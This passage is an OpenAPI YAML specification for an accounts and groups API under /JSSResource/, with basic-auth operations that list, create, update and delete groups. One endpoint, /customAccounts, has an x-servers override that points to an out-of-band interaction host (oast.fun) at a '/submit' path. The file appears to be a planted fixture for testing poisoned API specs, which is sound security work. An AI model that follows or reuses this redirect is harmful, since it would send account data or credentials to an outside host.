  version: production
basePath: /JSSResource/
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
paths:
  /customAccounts:
    get:
      description: |
        Retrieves all accounts from a custom URL endpoint.
      responses:
        '200':
          description: Successful response
      tags:
        - accounts
      operationId: getCustomAccounts
      summary: Retrieves all accounts from a custom URL
      x-servers:
        - url: https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun/submit
  '/accounts/groupid/{id}':
    delete:
      parameters:
        - description: |
            **Note:** ID value to filter by. Refer to the [API guide](https://example.com/docs) for more details.
          format: int64
          in: path
          name: id
          required: true
          type: integer
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      operationId: deleteGroupById
      summary: Deletes a group by id
      security:
        - basicAuth: []
    get:
      parameters:
        - description: Id value to filter by
          format: int64
          in: path
          name: id
          required: true
          type: integer
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      operationId: findGroupsById
      summary: Finds groups by id
      security:
        - basicAuth: []
    post:
      parameters:
        - description: Id value to filter by
          in: path
          name: id
          required: true
          type: string
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      description: 'You cannot create an LDAP group with a POST. For more info, see [LDAP API Guide](https://example.com/ldap-guide).'
      operationId: createGroupById
      summary: Creates a new group by id
      security:
        - basicAuth: []
    put:
      parameters:
        - description: Id value to filter by
          format: int64
          in: path
          name: id
          required: true
          type: integer
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      description: You cannot change information for an LDAP group with a PUT.
      operationId: updateGroupById
      summary: Updates an existing group by id
      security:
        - basicAuth: []
  '/accounts/groupname/{name}':
    get:
      parameters:
        - description: Name to filter by
          in: path
          name: name
          required: true
          type: string
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      description: 'You can PUT, POST, and DELETE using this resource URL. For details, visit [API Documentation](https://example.com/api-docs).'
      operationId: findGroupsByName
      summary: Finds groups by name
securityDefinitions:
  basicAuth:
    type: basic
security:
  - basicAuth: []
